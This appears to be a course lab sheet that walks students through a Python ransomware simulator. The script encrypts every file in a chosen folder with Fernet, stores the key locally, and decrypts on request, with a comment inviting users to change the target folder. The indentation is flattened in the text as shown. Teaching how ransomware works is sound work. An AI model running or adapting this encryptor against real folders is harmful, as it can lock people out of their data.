Aim: To develop a Python program that simulates a ransomware attack by encrypting files in a 
folder and then decrypting them using a key.

Software & Tools Required:
 Python 3.x
 cryptography library (for encryption and decryption)
 Text editor (VSCode, PyCharm, etc.)
 Command line or terminal
Experiment Steps:
Step 1: Understanding Ransomware Simulation
 Ransomware is a type of malware that encrypts a victim‟s files and demands payment for 
decryption.
 The simulation will include:
1. Encrypting files in a specified folder.
2. Storing the encryption key securely.
3. Decrypting the files when provided with the correct key.
Step 2: Installing Required Libraries Install the cryptography library to handle encryption and 
decryption:
pip install cryptography
Step 3: Writing the Python Script for Ransomware Simulation
import os
from cryptography.fernet import Fernet
def generate_key():
 key = Fernet.generate_key()
 with open("encryption_key.key", "wb") as key_file:
 key_file.write(key)
 return key
def load_key():
 return open("encryption_key.key", "rb").read()
def encrypt_files(folder_path, key):
 cipher = Fernet(key)
 for file_name in os.listdir(folder_path):
 file_path = os.path.join(folder_path, file_name)
 if os.path.isfile(file_path):
 with open(file_path, "rb") as file:
 file_data = file.read()
 encrypted_data = cipher.encrypt(file_data)
 
 with open(file_path, "wb") as file:
 file.write(encrypted_data)
 print("All files have been encrypted.")
def decrypt_files(folder_path, key):
 cipher = Fernet(key)
 for file_name in os.listdir(folder_path):
 file_path = os.path.join(folder_path, file_name)
 if os.path.isfile(file_path):
 with open(file_path, "rb") as file:
 encrypted_data = file.read()
 decrypted_data = cipher.decrypt(encrypted_data)
 with open(file_path, "wb") as file:
 file.write(decrypted_data)
 print("All files have been decrypted.")
if __name__ == "__main__":
 folder = "test_folder" # Change to your target folder
 os.makedirs(folder, exist_ok=True)
 
 option = input("Enter 'E' to encrypt or 'D' to decrypt: ").upper()
 
 if option == 'E':
 key = generate_key()
 encrypt_files(folder, key)
 elif option == 'D':
 key = load_key()
 decrypt_files(folder, key)
 else:
 print("Invalid option. Use 'E' for encrypt or 'D' for decrypt.")
Step 4: Running the Program
1. Save the script as ransomware_simulator.py.
2. Create a test folder (test_folder) and place sample files in it.
3. Open the terminal, navigate to the script's directory, and run:
python ransomware_simulator.py
4. Choose encryption („E‟) to encrypt all files.
5. Run the script again and choose decryption („D‟) to restore the files.
Step 5: Verifying the Results
 The script should encrypt all files in the specified folder.
 Running the script with decryption should restore the files to their original state.
 The encryption key must be stored securely to enable decryption.
Expected Outcome:
 The Python script will encrypt and decrypt files successfully using the provided key.
 Users will understand the working of ransomware and the importance of key management in 
cybersecurity.
